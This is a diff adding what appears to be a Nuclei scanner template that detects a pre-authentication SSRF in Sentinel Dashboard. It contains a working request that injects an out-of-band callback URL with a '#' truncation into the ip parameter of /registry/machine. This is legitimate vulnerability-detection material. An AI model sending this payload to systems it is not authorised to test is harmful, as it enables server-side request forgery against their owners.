@@ -1,0 +1,30 @@
+id: sentinel-dashboard-ssrf
+info:
+  name: Sentinel Dashboard SSRF
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Sentinel Dashboard has a pre-authentication SSRF vulnerability. The `ip` field can be manipulated to perform SSRF attacks by using a `#` truncation.
+  reference:
+    - https://github.com/alibaba/Sentinel/issues/2451
+  classification:
+    cvss-score: 7.0
+  metadata:
+    product: Sentinel
+    vuln_type: Server-Side Request Forgery
+http:
+  - raw:
+      - |
+        GET /registry/machine?app=SSRF-TEST&appType=0&version=0&hostname=TEST&ip={{interactsh-url}}%23&port=80 HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+      - type: word
+        part: body
+        words:
+          - "success"
